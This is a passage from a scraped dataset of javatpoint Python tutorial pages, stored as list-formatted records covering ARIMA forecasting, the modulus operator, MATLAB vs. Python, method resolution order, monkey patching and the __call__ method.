the time series stationary in order to build an ARIMA model. This is because the term 'Auto Regressive' in ARIMA implies a Linear Regression Model using its lags as predictors. And as we already know, Linear Regression Models work well for independent and non-correlated predictors."", ""The 'p' is the order of the 'AR' (Auto-Regressive) term, which means that the number of lags of Y to be utilized as predictors. At the same time, 'q' is the order of the 'MA' (Moving Average) term, which means that the number of lagged forecast errors should be used in the ARIMA Model."", ""The Augmented Dickey-Fuller (ADF) test's null hypothesis is that the time series is not stationary. Thus, if the ADF test's p-value is less than the significance level (0.05), then we will reject the null hypothesis and infer that the time series is definitely stationary. As we can observe, the p-value is more significant than the level of significance. Therefore, we can difference the series and check the plot of autocorrelation as shown below."", 'In the above example, we have imported the required libraries and modules. We have then imported the data and plot different graphs. We have plotted the original series graph, first-order differencing, and second-order differencing along with their autocorrelation graphs. As we can observe, the time series has reached stationarity with two differencing orders. However, when we have a look at the plot of autocorrelation for the Second order of differencing, the lag going into the far negative zone pretty faster, indicating the series might have been over differenced.', ""In the above example, we have imported the ndiffs method of the pmdarima module. We have then imported the dataset and defined 'X' as the object containing the values from the dataset. We used the ndiffs method to perform ADF, KPSS, and PP Tests and printed their results to the users."", 'We can consider Partial Autocorrelation as the correlation between the series and its lag once we exclude the contributions from the intermediate lags. Thus, PACF tends to convey the pure correlation between the series and its lag. Hence, we can identify whether that lag is required in the Auto-Regressive (AR) term or not.', 'As we know, any Autocorrelation in a stationary series can be rectified by inserting enough AR terms. Thus, we can initially take the order of the Auto-Regressive (AR) term equivalent to as many lags that cross the limit of significance in the PACF Plot.', 'As a result, we can observe that the PACF lag 1 is pretty significant above the line of significance. Lag 2 also appears to be substantial, entirely maintaining to cross the limit of significance (blue region). However, we will be conservative and fix the p as one tentatively.', ""Similar to what we have looked at earlier at the PACF plot for the number of Auto-Regressive (AR) Terms, we can use the ACF plot to find the number of Moving Average (MA) Terms. A Moving Average (MA) term is, theoretically, the lagged forecast's error."", 'In the above example, we have imported the required libraries, modules, and datasets. We have then plotted the graphs to represent the First Order Differencing and its Autocorrelation. As a result, we can observe that some lags are pretty above the line of significance. So, let us fix q as 2, tentatively. We can also use the simpler model in case of any doubt that adequately demonstrates the Y.', 'Sometimes, a situation may occur where the series is slightly under-differenced, and differencing it one time extra makes the series somewhat over-differenced. In such cases, we have to add one or multiple additional Auto-Regressive (AR) Terms for the slightly under-differenced Time Series and add an extra Moving Average (MA) Term for the slightly over-differenced Time Series.', ""In the above example, we have imported the new module called ARIMA from the statsmodels class and create the ARIMA model of the order 1, 1, and 2. We have then printed the summary of the model to the user. As we can observe, the overview of the model reveals a lot of details. The middle table is the table of coefficients where the 'coef' values act as the related terms' weights."", 'In the above example, we have plotted the residual errors and density graphs. We can observe that the residual errors look fair with around zero mean and uniform variance. Let us plot the graph representing the actuals vs. fitted values with the help of the plot_predict() function.']","['from statsmodels.tsa.stattools import adfuller', 'from numpy import log', 'import pandas as pd', ""mydata = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", 'res = adfuller( mydata.value.dropna())', ""print('Augmented Dickey-Fuller Statistic: %f' % res[0])"", ""print('p-value: %f' % res[1])"", 'import numpy as np, pandas as pd', 'from statsmodels.graphics.tsaplots import plot_acf, plot_pacf', 'import matplotlib.pyplot as plt', ""plt.rcParams.update({'figure.figsize' : (9,7), 'figure.dpi' : 120})"", '# Importing data', ""df = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", '# The Genuine Series', 'fig, axes = plt.subplots(3, 2, sharex = True)', ""axes[0, 0].plot(df.value); axes[0, 0].set_title('The Genuine Series')"", 'plot_acf(df.value, ax = axes[0, 1])', '# Order of Differencing: First', ""axes[1, 0].plot(df.value.diff()); axes[1, 0].set_title('Order of Differencing: First')"", 'plot_acf(df.value.diff().dropna(), ax = axes[1, 1])', '# Order of Differencing: Second', ""axes[2, 0].plot(df.value.diff().diff()); axes[2, 0].set_title('Order of Differencing: Second')"", 'plot_acf(df.value.diff().diff().dropna(), ax = axes[2, 1])', 'plt.show()', 'from pmdarima.arima.utils import ndiffs', 'import pandas as pd', ""df = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", 'X = df.value', '# Augmented Dickey Fuller Test', ""adftest = ndiffs(X, test = 'adf')"", '# KPSS Test', ""kpsstest = ndiffs(X, test = 'kpss')"", '# PP Test', ""pptest = ndiffs(X, test = 'pp')"", 'print(""ADF Test ="", adftest)', 'print(""KPSS Test ="", kpsstest)', 'print(""PP Test ="", pptest)', 'import numpy as np, pandas as pd', 'from statsmodels.graphics.tsaplots import plot_acf, plot_pacf', 'import matplotlib.pyplot as plt', ""plt.rcParams.update({'figure.figsize':(9,3), 'figure.dpi':120})"", '# importing data', ""df = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", 'fig, axes = plt.subplots(1, 2, sharex = True)', ""axes[0].plot(df.value.diff()); axes[0].set_title('Order of Differencing: First')"", 'axes[1].set(ylim = (0,5))', 'plot_pacf(df.value.diff().dropna(), ax = axes[1])', 'plt.show()', 'import numpy as np, pandas as pd', 'from statsmodels.graphics.tsaplots import plot_acf, plot_pacf', 'import matplotlib.pyplot as plt', ""plt.rcParams.update({'figure.figsize' : (9,3), 'figure.dpi' : 120})"", '# importing data', ""mydata = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", 'fig, axes = plt.subplots(1, 2, sharex = True)', ""axes[0].plot(mydata.value.diff()); axes[0].set_title('Order of Differencing: First')"", 'axes[1].set(ylim = (0, 1.2))', 'plot_acf(mydata.value.diff().dropna(), ax = axes[1])', 'plt.show()', 'import numpy as np, pandas as pd', 'from statsmodels.tsa.arima_model import ARIMA', '# importing data', ""mydata = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", '# Creating ARIMA model', 'mymodel = ARIMA(mydata.value, order = (1, 1, 2))', 'modelfit = mymodel.fit(disp = 0)', 'print(modelfit.summary())', 'import numpy as np, pandas as pd', 'from statsmodels.tsa.arima_model import ARIMA', '# importing data', ""mydata = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", '# Creating ARIMA model', 'mymodel = ARIMA(mydata.value, order = (1, 1, 1))', 'modelfit = mymodel.fit(disp = 0)', 'print(modelfit.summary())', 'import numpy as np, pandas as pd', 'from statsmodels.tsa.arima_model import ARIMA', 'import matplotlib.pyplot as plt', ""plt.rcParams.update({'figure.figsize' : (9,3), 'figure.dpi' : 120})"", '# importing data', ""mydata = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", '# Creating ARIMA model', 'mymodel = ARIMA(mydata.value, order = (1, 1, 1))', 'modelfit = mymodel.fit(disp = 0)', '# Plotting Residual Errors', 'myresiduals = pd.DataFrame(modelfit.resid)', 'fig, ax = plt.subplots(1,2)', 'myresiduals.plot(title = ""Residuals"", ax = ax[0])', ""myresiduals.plot(kind = 'kde', title = 'Density', ax = ax[1])"", 'plt.show()', 'import numpy as np, pandas as pd', 'from statsmodels.tsa.arima_model import ARIMA', 'import matplotlib.pyplot as plt', ""plt.rcParams.update({'figure.figsize' : (9,3), 'figure.dpi' : 120})"", '# importing data', ""mydata = pd.read_csv('mydataset.csv', names = ['value'], header = 0)"", '# Creating ARIMA model', 'mymodel = ARIMA(mydata.value, order = (1, 1, 1))', 'modelfit = mymodel.fit(disp = 0)', '# Actual vs Fitted', 'modelfit.plot_predict(dynamic = False)', 'plt.show()']","['Augmented Dickey-Fuller Statistic: -2.464240', 'p-value: 0.124419', 'ADF Test = 2', 'KPSS Test = 0', 'PP Test = 2', 'ARIMA Model Results', '==============================================================================', 'Dep. Variable:                D.value   No. Observations:                   99', 'Model:                 ARIMA(1, 1, 2)   Log Likelihood                -253.790', 'Method:                       css-mle   S.D. of innovations              3.119', 'Date:                Thu, 15 Apr 2021   AIC                            517.579', 'Time:                        21:10:37   BIC                            530.555', 'Sample:                             1   HQIC                           522.829', '=================================================================================', 'coef    std err          z      P>|z|      [0.025      0.975]', '---------------------------------------------------------------------------------', 'const             1.1202      1.290      0.868      0.385      -1.409       3.649', 'ar.L1.D.value     0.6351      0.257      2.469      0.014       0.131       1.139', 'ma.L1.D.value     0.5287      0.355      1.489      0.136      -0.167       1.224', 'ma.L2.D.value    -0.0010      0.321     -0.003      0.998      -0.631       0.629', 'Roots', '=============================================================================', 'Real          Imaginary           Modulus         Frequency', '-----------------------------------------------------------------------------', 'AR.1            1.5746           +0.0000j            1.5746            0.0000', 'MA.1           -1.8850           +0.0000j            1.8850            0.5000', 'MA.2          545.5472           +0.0000j          545.5472            0.0000', '-----------------------------------------------------------------------------', 'ARIMA Model Results', '==============================================================================', 'Dep. Variable:                D.value   No. Observations:                   99', 'Model:                 ARIMA(1, 1, 1)   Log Likelihood                -253.790', 'Method:                       css-mle   S.D. of innovations              3.119', 'Date:                Thu, 15 Apr 2021   AIC                            515.579', 'Time:                        21:34:00   BIC                            525.960', 'Sample:                             1   HQIC                           519.779', '=================================================================================', 'coef    std err          z      P>|z|      [0.025      0.975]', '---------------------------------------------------------------------------------', 'const             1.1205      1.286      0.871      0.384      -1.400       3.641', 'ar.L1.D.value     0.6344      0.087      7.317      0.000       0.464       0.804', 'ma.L1.D.value     0.5297      0.089      5.932      0.000       0.355       0.705', 'Roots', '=============================================================================', 'Real          Imaginary           Modulus         Frequency', '-----------------------------------------------------------------------------', 'AR.1            1.5764           +0.0000j            1.5764            0.0000', 'MA.1           -1.8879           +0.0000j            1.8879            0.5000', '-----------------------------------------------------------------------------']",[],"['|||p = the order of the AR term|||q = the order of the MA term|||d = the number of differences required to make the time series stationary|||&&&|||Yearly (For example, Annual Budget)|||Quarterly (For example, Expenses)|||Monthly (For example, Air Traffic)|||Weekly (For example, Sale Quantity)|||Daily (For instance, Weather)|||Hourly (For example, Stocks Price)|||Minutes wise (For example, Inbound Calls in a Call Centre)|||Seconds wise (For example, Web Traffic)||||||Univariate Time Series Forecasting: The Univariate Time Series Forecasting is a forecasting of time series where we utilize the former values of the time series only in order to guess the forthcoming values.|||Multi-Variate Time Series Forecasting: The Multi-Variate Time Series Forecasting is a forecasting of time series where we utilize the predictors other than the series, also known as exogenous variables, in order to forecast.|||']"
191,['Python Modulus Operator'],"['Like other programming languages, the Python modulus operator does the same work to find the modulus of the given number. The operator is a mathematical symbol used to perform different operations such as (+, -, * /) addition, subtraction, multiplication, and division on the given two numbers to return the result in the form of an integer as well as the float number. An operator tells the compiler to perform certain actions based on the passed operator symbol to the given number.']","['https://www.javatpoint.com/matlab-vs-python', 'https://www.javatpoint.com/arima-model-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/matlab-vs-python', 'https://www.javatpoint.com/arima-model-in-python', 'https://www.javatpoint.com/matlab-vs-python']",['https://static.javatpoint.com/python/images/python-modulus-operator.png'],[],['Modulus Operator'],"['Get the modulus of two integers numbers using while loop', 'Get the modulus of two float numbers', 'Get the modulus of a negative number', 'Get the modulus of two numbers using fmod() function', 'Get the modulus of n numbers using function', 'Get the modulus of given array using mod() function', 'Get the modulus of two numbers using numpy.', 'Exceptions in Python Modulus operator']",[],"['Following are the syntax to get the remainder by dividing the first number from the second.', ""Let's write a program to get the remainder of two numbers using the while loop and modulus (%) operator in Python."", 'Get_rem.py', ""Let's write a program to find the remainder of two integer number using the modulus operator in Python."", ""Let's write a program to get the remainder of two negative number using while loop and modulus (%) operator in Python."", ""Let's write a program to get the remainder of two float number using fmod() function in Python."", ""Let's write a Python program to find the modulus of n number using function and for loop."", 'getRemainder.py', ""Let's write a program to demonstrate the mod() function in Python."", 'Mod_fun.py', ""Let's consider a program to import a numpy package from the Python library and then use the remainder function to get the modulus in Python."", ""Let's write a program to demonstrate the Python Exception in Modulus operator.""]","['Here X and Y are two integer numbers, and the modulus (%) is used in between to get the remainder where the first number (X) is divided by the second number (Y).', 'As we can see in the above program, x and y variables hold the arrays. After that, we use the mod() function to pass x and y as the array parameter that divides the first array(x) by the second array(y) and then returns the remainder of the numbers.', 'As we can see in the above result, it displays, ""Cannot divide a number by zero! So, change the value of the right operand"". Hence, we can say, when we divide the first number by zero, it returns an exception.']","['Python Modulus Operator is an inbuilt operator that returns the remaining numbers by dividing the first number from the second. It is also known as the Python modulo. In Python, the modulus symbol is represented as the percentage (%) symbol. Hence, it is called the remainder operator.', 'For example, we have two numbers, 24 and 5. And we can get the remainder by using the modulus or modulo operator between the numbers 24 % 5. Here 24 is divided by 5 that returns 4 as the remainder, and 4 as the quotient. When the first number is completely divisible by another number without leaving any remainder, the result will be 0.', 'In Python, when a number is divided by zero, it throws an exception, and the exception is called the ZeroDivisionError. In other words, it returns an exception when a number is divisible by a divisor that is zero. Therefore, if we want to remove the exception from the Python modulus operator, the divisor should not be zero.']","['Rem = X % Y', 'while True: # if the while condition is true if block is executed', ""a = input ('Do you want to continue or not (Y / N)? ')"", ""if a.upper() != 'Y':  # If the user pass 'Y', the following statement is executed."", 'break', ""a = int(input (' First number is: ')) # first number"", ""b = int(input (' Second number is: ')) # second number"", ""print(a, ' % ', b, ' = ', a % b) # perform a % b"", ""print(b, ' % ', a, ' = ', b % a) # perform b % a"", ""x = float(input ('First number: '))"", ""y = float(input (' Second number: '))"", 'res = x % y # store the remainder in res variable', 'print(""Modulus of two float number is: "", x, ""%"", y, "" = "", res, sep = "" "")', 'while True:', ""x = input(' Do you want to continue (Y / N)? ')"", ""if x.upper() != 'Y':"", 'break', '# input two integer number and store it into x and y', ""x = int(input (' First number: '))"", ""y = int(input (' Second number: '))"", 'print(""Modulus of negative number is: "", x, ""%"", y, "" = "", x % y, sep = "" "")', 'print(""Modulus of negative number is: "", y, ""%"", x, "" = "", y % x, sep = "" "")', 'import math    # import math package to use fmod() function.', 'res = math.fmod(25.5, 5.5) # pass the parameters', 'print (""Modulus using fmod() is:"", res)', 'ft = math.fmod(75.5, 15.5)', 'print ("" Modulus using fmod() is:"", ft)', '# take two integer from the user', 'x = int( input( ""First number is""))', 'y = int (input (""Second number is ""))', 'out = math.fmod(x, y) # pass the parameters', 'print(""Modulus of two numbers using fmod() function is"", x, "" % "", y, "" = "", out)', 'def getRemainder(n, k):', 'for i in range(1, n + 1):', '# Store remainder in the rem variable when i is divided by k number', 'rem = i % k', 'print(i, "" % "", k, "" = "", rem, sep = "" "")', '# use _name_ driver code', 'if __name__ == ""__main__"":', '# define the first number for displaying the number up to desired number.', 'n = int(input (""Define a number till that you want to display the remainder ""))', 'k = int( input ("" Enter the second number "")) # define the divisor', '# call the define function', 'getRemainder(n, k)', 'import numpy as np # import numpy package', 'x = np.array([40, -25, 28, 35]) # define first array', 'y = np.array([20, 4, 6, 8]) # define second array', '# call mod() function and pass x and y as the parameter', 'print(""The modulus of the given array is "", np.mod (x, y))', 'import numpy as np # import numpy package as np', '# declaration of the variables with their values', 'num = 38', 'num2 = 8', 'res = np.remainder(num, num2) # use np.remainder() function', 'print( ""Modulus is"", num, "" % "", num2, "" = "", res) # display modulus num % num2', ""x = int(input (' The first number is: '))"", ""y = int(input (' The second number is: '))"", '# display the exception handling', 'try: # define the try', ""print (x, ' % ', y, ' = ', x % y)"", 'except ZeroDivisionError as err: # define the exception', ""print ('Cannot divide a number by zero! ' + 'So, change the value of the right operand.' )""]","['Do you want to continue or not (Y / N)? Y', 'First number is: 37', 'Second number is: 5', '37 % 5 = 2', '5 % 37 = 5', 'Do you want to continue or not (Y / N)? Y', 'First number is: 37', 'Second number is: 5', '24 % 5 = 4', '5 % 24 = 5', 'Do you want to continue or not (Y / N)? Y', 'First number is: 37', 'Second number is: 5', '28 % 5 = 3', '5 % 28 = 5', 'First number: 40.5', 'Second number: 20.5', 'Modulus of two float number is:  40.5 % 20.5 = 20.0', 'First number: -10', 'Second number: 3', 'Modulus of negative number is:  -10 % 3  =  2', 'Modulus of negative number is:  3 % -10  =  -7', 'Do you want to continue (Y / N)? N', 'Modulus using fmod() is: 3.5', 'Modulus using fmod() is: 13.5', 'First number is 24', 'Second number is 5', 'Modulus of two numbers using fmod() function is 24  %  5  =  4.0', 'Define a number till that you want to display the remainder 7', 'Enter the second number 5', '1 % 5 = 1', '2 % 5 = 2', '3 % 5 = 3', '4 % 5 = 4', '5 % 5 = 0', '6 % 5 = 1', '7 % 5 = 2', 'The modulus of the given array is [0 3 4 3]', 'Modulus is 38 % 8 = 6', 'The first number is: 24', 'The second number is: 0', 'Cannot divide a number by zero! So, change the value of the right operand.']",[],[]
192,['MATLAB vs. Python'],"[""In this tutorial, we will discuss the difference between MATLAB and Python. Both technologies are leading in the scientific fields. Python is the most popular, widely used language where MATLAB is a leading language in mathematics. In the current world, we are getting to be more logical and measurements. That's why logical computing emerges over the other approach.""]","['https://www.javatpoint.com/method-resolution-order-in-python', 'https://www.javatpoint.com/python-modulus-operator', 'https://www.javatpoint.com/https://www.javatpoint.com/matlab', 'https://www.javatpoint.com/https://www.javatpoint.com/programming-language', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/java-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/cpp-tutorial', 'https://www.javatpoint.com/method-resolution-order-in-python', 'https://www.javatpoint.com/python-modulus-operator', 'https://www.javatpoint.com/method-resolution-order-in-python']",[],[],"['MATLAB', 'Python', 'Difference between MATLAB vs. Python', 'Conclusion']","['Advantages of MATLAB', 'Disadvantages of MATLAB', 'Advantages of Python', 'Disadvantages of Python']",[],"[""Let's have a brief introduction to MATLAB."", 'Cleve Moler developed it in late 1970. Some scientists consider it as a successor of FORTRAN. MATLAB can create graphic illustrations.', 'MATLAB provides many useful features to user, but here we will explain some key features.', 'It comes with some shortcomings due to commercial nature. The disadvantages are given below.', 'There is another site of a picture; Python also consists of some disadvantages which are as follows.', 'Below are the important difference between Python and MATLAB.']","['Python is general-purpose, high-level, user-friendly, and open-source programming language. Python is a platform independent language which means it can run on any platform. It provides the easy-syntax and widely used language.', ""Python has many advantages over the other programming languages and that are the reason of popularity of Python. Let's see some advantages of Python as follows."", 'We have explored the advantages and disadvantages of both programming languages. Python is popular for its vast built-in libraries and more readable. However, we talk about the complex MATLAB is more convenient than Python.']","['MATLAB is a commercial numeric computing environment and programming language. It is the easiest and productive environment for engineers and scientists and is completely dedicated to mathematical operations and technical computing. It provides advanced toolboxes such as Digital Signal Processing, Image processing, control design, etc.', 'Python is one of the most leading programming languages and used in every technology domain such as machine learning, artificial Intelligence, web application, and gaming. It takes less lines of code other than the other programming languages such as java and C++ to perform any tasks. Python is composed in convenient ANSI C.', 'We have got the idea about both languages. We have discussed the basic concept of Python and MATLAB. Both programming languages can be used in the scientific and engineering field. MATLAB is designed to perform mathematical computation where Python has a crucial role in the data science field.']",[],[],"[""Sr. No|||Python|||MATLAB&&&1.|||Python is a general-purpose, user-friendly programming language which is developed in portable in ANSI C.|||MALTAB is a language as well as commercial numeric computing environment.&&&2.|||Python comes with the most important libraries: numpy, scipy, pyOpenGI, matplotlib, visvis, pygame, etc.|||MATLAB comes with an advanced toolkit like image processing, statistics, optimization, etc.&&&3.|||It provides real-time support.|||It doesn't provide real-time support.&&&4.|||Python has the several built-in data types that can be used to accomplish number of tasks.|||MATLAB is an array-focused language. It treats most data types as array of some array.&&&5.|||Python has excellent community support across the world.|||MATLAB doesn't have supportive community as Python.&&&6.|||It includes a broad standard library.|||It doesn't contain bland programming functionality.&&&7.|||In terms of performance, Python is much efficient to perform a task. It is more expressive and readable programming language.|||MATLAB is a less expressive and less efficient language than the Python. But it provides more readable graphical capabilities than Python.&&&8.|||Python works on the 0-based indexing which means an array or list indexing starts from the 0.|||On the other hand, MATLAB supports the one-based indexing which is quit helpful in vectors and matrices.&&&9.|||Python offers us completely open environment so that anyone can use and contribute it.|||MATLAB is specially designed for numerical investigation, graphical visualization, etc.&&&10.|||Python has a stunning iterative loop structure.|||MATLAB has the worst iterative loop structure.""]","[""|||It consists of many useful built-in functions.|||It saves time and costs.|||It is not just a programming language but also a programming interface.|||Provides full features for iterative exploration and problem solving within the Desktop environment.|||Provides built in graphic so that programmer can easily plot the custom graph and tools.|||High-level language specially intended for engineering and scientific computing.|||It provides an interface to work with other programming languages like C, C++, Java, .NET, Python, SQL, Hadoop, etc.|||It provides much productivity. For example - When we prepare the data for analysis and waste most of our time preparing manually. With the help of MATLAB, we can automate the collection and preparation of data. We can also reduce the time and accuracy.|||MATLAB provides effective garbage collection and multi-threaded support.||||||It isn't easy to extend the functionality through third parties due to its proprietary nature.|||It is less expressive language.|||It is quite expensive, which means code written in MATLAB can only be used the other person has a license.|||In MATLAB, the indexing is done using braces rather than brackets, making it hard to differentiate it from a function call.|||There is no real-time support in MATLAB.|||Using MATLAB, we cannot create stand-alone applications.|||It isn't easy to integrate with another language.||||||Easy to use and easy to learn.|||Highly portable, which means it can run on any platform -High-end servers and workstations.|||It is an extensible and open-source language.|||No use of curly braces to define block code.|||A large set of built-in libraries.|||It was mainly designed to work with data science.|||Provide easy interaction with the other programming language such as R, C++, etc.||||||Python is an interpreted language, and therefore it executes the code much slowly.|||Python is not suitable for mobile app development.|||It consumes a lot of memory.|||Python has a limitation with database access.|||Python is a dynamically typed language, and that's why it shows the error at the runtime.|||Immature trading packages.|||""]"
193,['Method Resolution Order in Python'],"['In this tutorial, we will learn about method resolution order, which is also known as the MRO. It is an essential concept of Python inheritance.']","['https://www.javatpoint.com/monkey-patching-in-python', 'https://www.javatpoint.com/matlab-vs-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/monkey-patching-in-python', 'https://www.javatpoint.com/matlab-vs-python', 'https://www.javatpoint.com/monkey-patching-in-python']",[],[],"['Introduction', 'Old and New Style Order', 'DLR Algorithm', 'C3 Linearization Algorithm', 'Method for Method Resolution class']",['Rules of C3 Linearization Algorithm'],[],"['It plays an essential role in multiple inheritance where the same method can be found in the multiple superclasses.', ""To understand it in a better way, let's see how we can use it."", 'Explanation -', 'The order is followed in the above code is class B - > class A. This technique is known as MRO (method resolution order).', ""Let's understand another example of multiple inheritance."", 'Explanation -', ""If class B wouldn't have a method, it will invoke the class C method."", 'Here, we are suggesting you remove the class B method and check what happens. By doing this, you will get an idea of how the method resolution works.', 'We can assume working by its name as method resolution will search depth-first, and then go left to right. Below is the example.', 'In the above example, the method resolution order will be -', 'But, A cannot be twice present so -', ""This algorithm shows the strange behavior at the time. Let's see the below example."", 'Samuele Perdoni was the first person who discovered an inconsistency between the MRO algorithms.', ""Let's understand the following example.""]","['Method resolution order describes the search path of the class which Python uses to get the appropriate method in classes that contain the multi-inheritance.', 'In simple words - ""The method or attributes is explored in the current class, if the method is not present in the current class, the search moves to the parent classes, and so on"". This is an example of a depth-first search.', 'Python creates a list of classes while implementing the multiple inheritance between the classes. That list is used to determine which method has to be called one is invoked by instances.', ""According to DLR Algorithm, the order will be E, C, D, B, A. There is the interchange of classes A & B in class C, which is very ambiguous. It means the algorithm doesn't preserve the monotonicity property."", 'The C3 Linearization Algorithm is a better version of DLR algorithm because it removes the inconsistency. This algorithm has some restrictions that are given below.', 'Python provides two ways to get the method resolution order of a class - __mro__ attribute or mro() method. With the help of these methods, we can display the order of method in which they are resolved.', 'As we can see in the above output, we get the order of the method resolution order. In such a way, C3 linearization algorithm work for multiple inheritance.']","['As we know that, a class that being inherited is called the Subclass or Parent class, while the class that inherits is known as a child class or subclass. In the multi-inheritance, a class can consist of many functions, so the method resolution order technique is used to search the order in which the base class is executed.', 'There is a multiple inheritance in the above code. We have defined three-class called A, B, and C, and these classes have the same name method called myname(). We created an object class C. The object invoked class C, not the class, while class C inherited the class A method.', ""In the above code, we have created another D class without defining class attributes that inherited B and C class. When we invoked the method myname(), it goes to class D and searches for the myname() function. But class D doesn't have any declaration. Hence, the search transfers to class B, gets the myname() function, and returns the result. The search will take place as follows."", ""In the Older version of Python (2.1), we are restricted to use the old classes but Python (2.2 & continue), we can use the new classes. By default, Python 3 has original (new) classes. The new style class's first parent inherits from Python root 'object' class. Let's see the following example -"", 'The declaration style of both classes is different. In the method resolution, old-style classes follow the depth-first left to the right algorithm (DLR), whereas new style classes use the C3 Linearization algorithm while performing multiple inheritance.', 'First, the algorithm will search in the instance class for the invoked method. If not found, it goes into the first parents, if there is also not found. It will look into the parent of the parent. This will continue till the end of inheriting classes.']","['class A:', 'def myname(self):', 'print(""I am a class A"")', 'class B(A):', 'def myname(self):', 'print(""I am a class B"")', 'class C(A):', 'def myname(self):', 'print(""I am a class C"")', 'c = C()', 'print(c.myname())', 'class A:', 'def myname(self):', 'print("" I am a class A"")', 'class B(A):', 'def myname(self):', 'print("" I am a class B"")', 'class C(A):', 'def myname(self):', 'print(""I am a class C"")', '# classes ordering', 'class D(B, C):', 'd = D()', 'd.myname()', 'Class D -> Class B -> Class C -> Class A', '# Old style class', 'class OldStyleClass:', '# New style class', 'class NewStyleClass(object):', 'class A:', 'class B:', 'class C(A, B):', 'class D(B, A):', 'class E(C,D):', 'class D -> class B -> class A -> class C -> class A', 'class D -> class B -> class A -> class C ->', 'class A:', 'pass', 'class B:', 'pass', 'class C(A, B):', 'pass', 'class D(B, A):', 'pass', 'class E(C,D):', 'pass', 'class A:', 'def myname(self):', 'print("" I am a class A"")', 'class B(A):', 'def myname(self):', 'print("" I am a class B"")', 'class C(A):', 'def myname(self):', 'print(""I am a class C"")', '# classes ordering', 'class D(B, C):', '# it prints the lookup order', 'print(D.__mro__)', 'print(C.mro())']","['I am a class C', 'I am a class B', ""(<class '__main__.D'>, <class '__main__.B'>, <class '__main__.C'>, <class '__main__.A'>, <class 'object'>)"", ""[<class '__main__.C'>, <class '__main__.A'>, <class 'object'>]""]",[],"['|||Children must precede their parents.|||If a particular class inherits from the one or more classes, they are saved in the order specified in the tuple of the base class.||||||The structure of method resolution order defines by the inheritance graph.|||User must visit the super class only after the methods of the local classes are visited.|||Preserve Monotonicity|||']"
194,['Monkey Patching in Python'],"[""Monkey Patching is an exciting topic of Python. Monkey-patching is a term that refers to modifying a class or module at a run time. In simple words, a class or module's work can be changed at the runtime. Let's understand this concept by real-life example.""]","['https://www.javatpoint.com/python__call__method', 'https://www.javatpoint.com/method-resolution-order-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python__call__method', 'https://www.javatpoint.com/method-resolution-order-in-python', 'https://www.javatpoint.com/python__call__method']",[],[],"['Dynamic Behavior of Function', 'Memory Address Changing', 'Conclusion']",[],[],"['In monkey patching, we can reopen the class and modify its behavior', 'We will learn how we can use monkey-patching in using the Python code.', ""We know that Python is a dynamic language; classes are mutable, so we can alter them when we want. Let's understand the following example."", 'To add the divide() method to MonkeyPatch class, simply assign the divide function to MonkeyPatch.', ""The newly created function would be available in the MonkeyPatch class. Let's see the following example."", ""Let's see another example to understand the dynamic behavior in better way."", 'We have created a module which will use in the below code to change the behavior of hello() function at runtime.']",[],"['When we work on a large project, we may encounter a situation where the third-party library is not working well. So we attempt to revise (or change) it from our project. This process is known as monkey patching in Python. Generally, it is avoided by the developer. However, it is a part of the development process.', 'As we can see in the above code, there are two methods in the above class - __init__ and addition. We called the add() method and passed 20 as an argument. It retuned 30. We have defined the MultiPatch class with the add() method. Suppose we add the new method to the MonkeyPatch class.', 'Python provides the ctype module, which is used to change the value of an object by memory address management. So it is not recommended to do, direct memory manipulation is unsafe and not consistent. Possibly, it can work with one value and not for another.', 'We have discussed how we can achieve the monkey-patching in Python. But it consists of few disadvantages and should be used carefully. It is not good to use in application design because it distinguishes the source code on disk and the observed behavior. Developer can be confused while debugging.']","['import inspect', 'class MonkeyPatch:', 'def __init__(self, n1):', 'self.n1 = n1', 'def add(self, other):', 'return (self.n1 + other)', 'obj1 = MonkeyPatch(10)', 'obj1.add(20)', 'print(inspect.getmembers(obj1, predicate=inspect.ismethod))', 'def divide(self, n2):', 'return(self.n1 - self.n2)', 'MonkeyPatch.divide = divide', 'inspect.getmembers(obj, predicate=inspect.ismethod)', '# new_monk.py', 'class A:', 'def hello(self):', 'print ("" The hello() function is being called"")', 'import new_monk', 'def monkey_f(self):', 'print (""monkey_f() is being called"")', '# replacing address of ""func"" with ""monkey_f""', 'new_monk.A.hello = monkey_f', 'obj = new_monk.A()', '# calling function ""func"" whose address got replaced', '# with function ""monkey_f()""', 'obj.hello()']","['30', ""[('__init__', >), ('add', >)]"", ""[('__init__', >), ('subtraction', >)]"", 'monkey_f() is being called']",[],[]
195,['Python __call__ method'],"[""Method Names having double underscores as prefixes and suffixes are the reserved methods for particular use in Python. For example, the __init__ method is used for object constructors or the __call__ method for making object callable. We call these methods dunder methods, where dunder refers to Double Under (Underscores). These dunder methods are also known as magic methods - However, there is nothing magical related to them. There are many developers in the Python community who are not a big fan of the word 'magic', as it delivers a feeling that the use of this method is discouraged, but quite the contradiction is factual.""]","['https://www.javatpoint.com/python-heapq-module', 'https://www.javatpoint.com/monkey-patching-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-heapq-module', 'https://www.javatpoint.com/monkey-patching-in-python', 'https://www.javatpoint.com/python-heapq-module']",[],[],[],"['An Introduction to Magic Methods', 'Understanding the callable function']","['Note: The callable() method returns the Boolean value for whether the object appears to be callable. This function returns True if the object is callable; else, it returns False. Moreover, it is also possible that this function may return True even when the object is not callable. Still, if this method returns False, then the object is not callable.']","['Moreover, a Python class is always Callable. Thus, we can always utilize the callable() function with an object of the class, not the class itself.', 'Let us consider the following example in order to understand the behavior of the Python callable() function.', 'Explanation:', 'Let us consider an example of __call__() function.', 'Explanation:', 'Explanation:']","['The Object in Python is called callable when that object is defined within the __call__() function. The function for the same can be defined as x(arg 1, arg 2, …), which is short for x.__call__(arg1, arg2, …).', 'Moreover, we can observe that we have used the *args 